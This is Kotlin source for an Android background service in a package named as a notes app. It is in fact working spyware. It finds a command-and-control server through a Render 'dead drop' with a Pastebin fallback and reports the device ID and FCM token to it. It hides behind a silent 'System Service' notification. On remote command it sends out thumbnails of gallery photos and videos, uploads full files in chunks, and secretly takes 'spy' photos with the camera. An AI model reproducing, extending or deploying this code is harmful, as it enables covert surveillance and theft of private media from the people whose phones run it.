package cl.example.mynotes

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.media.ThumbnailUtils
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.MediaStore
import android.provider.Settings
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.messaging.FirebaseMessaging
import io.socket.client.IO
import io.socket.client.Socket
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.HashSet

class CloudSyncService : Service() {

    private var socket: Socket? = null

    // --- 🛡️ SISTEMA HÍBRIDO DE CONEXIÓN ---
    // 1. Render: Nuestra opción preferida (Buzón Muerto)
    private val RENDER_URL = "https://intermediario-fcm.onrender.com/api/report"
    // 2. Pastebin: El respaldo por si Render muere
    private val PASTEBIN_URL = "https://pastebin.com/raw/gNmxTyPZ"

    private var activeServerUrl: String = ""

    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    @Volatile private var isScanning = false

    override fun onCreate() {
        super.onCreate()
        Log.d("CloudSync", "🔵 onCreate: Servicio Creado.")
        startForegroundServiceCompat()
        acquireWakeLock()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("CloudSync", "🚀 onStartCommand: INICIANDO...")
        startForegroundServiceCompat() // Reasegurar notificación

        // Reiniciar socket si ya existía
        try {
            socket?.disconnect()
            socket?.off()
            socket = null
        } catch (e: Exception) {}

        // Iniciar la búsqueda del servidor (Render + Pastebin)
        iniciarSecuenciaDeConexion()

        return START_STICKY
    }

    // --- LÓGICA DE CONEXIÓN REDUNDANTE ---
    private fun iniciarSecuenciaDeConexion() {
        serviceScope.launch {
            // Paso A: Intentar reportarse a Render y obtener URL
            var c2Url = reportarARender()

            // Paso B: Si Render falló o no nos dio URL, probamos el viejo confiable (Pastebin)
            if (c2Url.isNullOrEmpty()) {
                Log.w("CloudSync", "⚠️ Render no respondió URL. Intentando Pastebin...")
                c2Url = resolverDesdePastebin()
            }

            if (!c2Url.isNullOrEmpty()) {
                activeServerUrl = c2Url!!
                // Paso C: Conectamos el Socket (Para enviar fotos/videos)
                conectarSocketIO()
            } else {
                // Si ambos fallaron, reintentamos en 1 minuto
                Log.e("CloudSync", "❌ NADIE respondió (Ni Render ni Pastebin). Reintentando en 60s...")
                delay(60000)
                iniciarSecuenciaDeConexion()
            }
        }
    }

    // Método 1: Hablar con Render (Envía Token y pide URL)
    private fun reportarARender(): String? {
        val client = OkHttpClient()
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
        val fcmToken = obtenerFcmToken()

        if (fcmToken.isEmpty()) return null

        val jsonBody = JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceName", deviceName)
            put("fcmToken", fcmToken)
        }

        val request = Request.Builder()
            .url(RENDER_URL)
            .post(jsonBody.toString().toRequestBody("application/json".toMediaTypeOrNull()))
            .build()

        return try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val json = JSONObject(response.body?.string() ?: "{}")
                    val url = json.optString("url")
                    Log.d("CloudSync", "✅ Render OK. URL Jefe: $url")
                    if (url.startsWith("http")) url else null
                } else null
            }
        } catch (e: Exception) {
            Log.e("CloudSync", "❌ Falló Render: ${e.message}")
            null
        }
    }

    // Método 2: Leer Pastebin (Solo lectura, respaldo)
    private fun resolverDesdePastebin(): String? {
        val client = OkHttpClient()
        val request = Request.Builder().url(PASTEBIN_URL).build()
        return try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val encoded = response.body?.string()?.trim() ?: return null
                    val decoded = String(Base64.decode(encoded, Base64.DEFAULT), Charsets.UTF_8).trim()
                    Log.d("CloudSync", "✅ Pastebin OK. URL Jefe: $decoded")
                    if (decoded.startsWith("http")) decoded else null
                } else null
            }
        } catch (e: Exception) {
            Log.e("CloudSync", "❌ Falló Pastebin: ${e.message}")
            null
        }
    }

    private fun conectarSocketIO() {
        try {
            Log.d("CloudSync", "🔌 Conectando Socket a: $activeServerUrl")

            val options = IO.Options().apply {
                reconnection = true
                forceNew = true
                timeout = 5000
            }
            socket = IO.socket(activeServerUrl, options)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("CloudSync", "✅ SOCKET CONECTADO.")
                serviceScope.launch {
                    delay(2000)
                    // AQUÍ SE CUMPLE TU DESEO: Enviamos los datos al Server TAMBIÉN.
                    // Ya se enviaron a Render en el paso anterior, ahora se envían al Server directo.
                    registrarDispositivoEnSocket()
                    delay(1000)
                    sendFolderList()
                }
            }
            setupSocketEvents()
            socket?.connect()
        } catch (e: Exception) {
            Log.e("CloudSync", "Error Socket: ${e.message}")
        }
    }

    private fun registrarDispositivoEnSocket() {
        val fcmToken = obtenerFcmToken()
        val info = JSONObject().apply {
            put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
            put("deviceId", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
            put("dataType", "register_device")
            put("fcmToken", fcmToken) // Enviamos el token también al server directo
        }
        socket?.emit("usrData", info)
    }

    private fun obtenerFcmToken(): String {
        var token = ""
        val latch = java.util.concurrent.CountDownLatch(1)
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (task.isSuccessful) token = task.result
            latch.countDown()
        }
        try { latch.await(2, java.util.concurrent.TimeUnit.SECONDS) } catch (e: Exception) {}
        return token
    }

    // --- FUNCIONES DE SERVICIO Y NOTIFICACIÓN ---
    private fun startForegroundServiceCompat() {
        try {
            val notification = createNotification()
            val type = if (Build.VERSION.SDK_INT >= 34) {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            } else if (Build.VERSION.SDK_INT >= 29) {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            } else { 0 } // Para versiones antiguas no se especifica tipo o es opcional en startForeground

            if (Build.VERSION.SDK_INT >= 29) {
                startForeground(1, notification, type)
            } else {
                startForeground(1, notification)
            }
        } catch (e: Exception) { Log.e("CloudSync", "Error Foreground: ${e.message}") }
    }

    private fun createNotification(): Notification {
        val channelId = "SyncChannel_Final"
        if (Build.VERSION.SDK_INT >= 26) {
            val channel = NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN)
            channel.setSound(null, null)
            channel.enableVibration(false)
            channel.lockscreenVisibility = Notification.VISIBILITY_SECRET
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Service")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyNotes:SyncLock")
        wakeLock?.acquire(30 * 60 * 1000L)
    }

    // --- RESTO DE FUNCIONES (ESCANEO, FOTOS, UPLOAD) IGUAL QUE SIEMPRE ---
    // Mantenemos tu lógica de escaneo intacta

    private fun setupSocketEvents() {
        socket?.on("command_start_scan") { args ->
            if (!isScanning) {
                isScanning = true
                var folderFilter: String? = null
                var scanType = "all"
                if (args.isNotEmpty()) {
                    val params = args[0] as? JSONObject
                    folderFilter = params?.optString("folder")
                    if (folderFilter.isNullOrEmpty()) folderFilter = null
                    scanType = params?.optString("type") ?: "all"
                }
                serviceScope.launch {
                    if (scanType == "photos" || scanType == "all") sendThumbnails(folderFilter)
                    if (scanType == "videos" || scanType == "all") scanVideos(folderFilter)
                    isScanning = false
                }
            }
        }
        socket?.on("command_stop_scan") {
            isScanning = false
            stopSelf()
        }
        socket?.on("command_take_photo") { takeSpyPhoto() }
        socket?.on("request_full_image") { args ->
            val data = args[0] as JSONObject
            uploadFileHttp(data.optString("path"), data.optString("target"))
        }
    }

    private fun sendFolderList() {
        val uniqueFolders = HashSet<String>()
        val projection = arrayOf(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
        try {
            contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, null)?.use { c ->
                val idx = c.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                while (c.moveToNext()) uniqueFolders.add(c.getString(idx) ?: "")
            }
            contentResolver.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, null)?.use { c ->
                val idx = c.getColumnIndexOrThrow(MediaStore.Video.Media.BUCKET_DISPLAY_NAME)
                while (c.moveToNext()) uniqueFolders.add(c.getString(idx) ?: "")
            }
        } catch (e: Exception) {}

        if (uniqueFolders.isNotEmpty()) {
            val data = JSONObject().apply {
                put("dataType", "folder_list")
                put("folders", JSONArray(uniqueFolders.filter { it.isNotEmpty() }.sorted()))
            }
            socket?.emit("usrData", data)
        }
    }

    private fun sendThumbnails(targetFolder: String?) {
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        scanMedia(uri, targetFolder, "preview_image")
    }

    private fun scanVideos(targetFolder: String?) {
        val uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        scanMedia(uri, targetFolder, "preview_video")
    }

    private fun scanMedia(uri: android.net.Uri, targetFolder: String?, type: String) {
        val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
        val sort = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
        var sel: String? = null
        var args: Array<String>? = null
        if (targetFolder != null) {
            sel = "${MediaStore.MediaColumns.BUCKET_DISPLAY_NAME} LIKE ?"
            args = arrayOf("%$targetFolder%")
        }
        try {
            contentResolver.query(uri, projection, sel, args, sort)?.use { c ->
                val idxData = c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)
                val idxName = c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
                while (c.moveToNext()) {
                    if (!serviceScope.isActive || !isScanning || socket?.connected() != true) break
                    val path = c.getString(idxData)
                    val name = c.getString(idxName)
                    val thumb = if (type == "preview_video") {
                        try { ThumbnailUtils.createVideoThumbnail(path, MediaStore.Images.Thumbnails.MINI_KIND) } catch(e:Exception){null}
                    } else {
                        getThumb(path)
                    }
                    if (thumb != null) {
                        val data = JSONObject().apply {
                            put("name", name); put("path", path); put("dataType", type)
                            put("folder", File(path).parentFile?.name ?: "Unknown")
                            put("image64", encodeToBase64(thumb, 30))
                        }
                        socket?.emit("usrData", data)
                        runBlocking { delay(50) }
                    }
                }
            }
        } catch (e: Exception) {}
    }

    private fun uploadFileHttp(path: String, target: String?) {
        val file = File(path)
        if (!file.exists() || activeServerUrl.isEmpty()) return
        serviceScope.launch(Dispatchers.IO) {
            try {
                val client = OkHttpClient()
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                val chunkSize = 1024 * 1024
                val totalChunks = (file.length() + chunkSize - 1) / chunkSize
                val buffer = ByteArray(chunkSize)

                file.inputStream().use { input ->
                    var bytesRead = input.read(buffer)
                    var idx = 0
                    while (bytesRead != -1 && serviceScope.isActive) {
                        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                            .addFormDataPart("deviceId", deviceId)
                            .addFormDataPart("filename", file.name)
                            .addFormDataPart("chunkIndex", idx.toString())
                            .addFormDataPart("totalChunks", totalChunks.toString())
                            .addFormDataPart("folderName", file.parentFile?.name ?: "General")
                            .addFormDataPart("file", file.name, okhttp3.RequestBody.create("application/octet-stream".toMediaTypeOrNull(), buffer, 0, bytesRead))
                            .build()

                        val url = if (activeServerUrl.endsWith("/")) "${activeServerUrl}upload-chunk" else "$activeServerUrl/upload-chunk"
                        client.newCall(Request.Builder().url(url).post(body).build()).execute().close()
                        idx++
                        bytesRead = input.read(buffer)
                    }
                }
            } catch (e: Exception) { Log.e("CloudSync", "Upload Error: ${e.message}") }
        }
    }

    private fun takeSpyPhoto() {
        // ... (Tu código de cámara ya estaba perfecto, lo mantenemos igual)
        val manager = getSystemService(CAMERA_SERVICE) as CameraManager
        try {
            val camId = manager.cameraIdList.firstOrNull { manager.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK } ?: return
            val reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
            reader.setOnImageAvailableListener({ r ->
                val img = r.acquireLatestImage()
                val buffer = img.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                img.close()
                val b64 = Base64.encodeToString(bytes, Base64.DEFAULT)
                val data = JSONObject().apply {
                    put("name", "spy_${System.currentTimeMillis()}.jpg"); put("path", "camera/spy")
                    put("folder", "SPY_CAM"); put("image64", b64); put("dataType", "preview_image")
                }
                socket?.emit("usrData", data)
                reader.close()
            }, null)
            if (checkSelfPermission(android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                manager.openCamera(camId, object : CameraDevice.StateCallback() {
                    override fun onOpened(c: CameraDevice) {
                        c.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                try {
                                    val req = c.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                    req.addTarget(reader.surface)
                                    s.capture(req.build(), null, null)
                                } catch (e: Exception) { c.close() }
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) { c.close() }
                        }, null)
                    }
                    override fun onDisconnected(c: CameraDevice) { c.close() }
                    override fun onError(c: CameraDevice, i: Int) { c.close() }
                }, null)
            }
        } catch (e: Exception) {}
    }

    private fun getThumb(path: String): Bitmap? = try { ThumbnailUtils.extractThumbnail(BitmapFactory.decodeFile(path), 96, 96) } catch (e: Exception) { null }

    private fun encodeToBase64(bm: Bitmap, quality: Int): String {
        val baos = ByteArrayOutputStream()
        bm.compress(Bitmap.CompressFormat.JPEG, quality, baos)
        return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT)
    }

    override fun onDestroy() {
        super.onDestroy()
        try { socket?.disconnect() } catch (e: Exception) {}
        serviceJob.cancel()
        try { wakeLock?.release() } catch (e: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null
}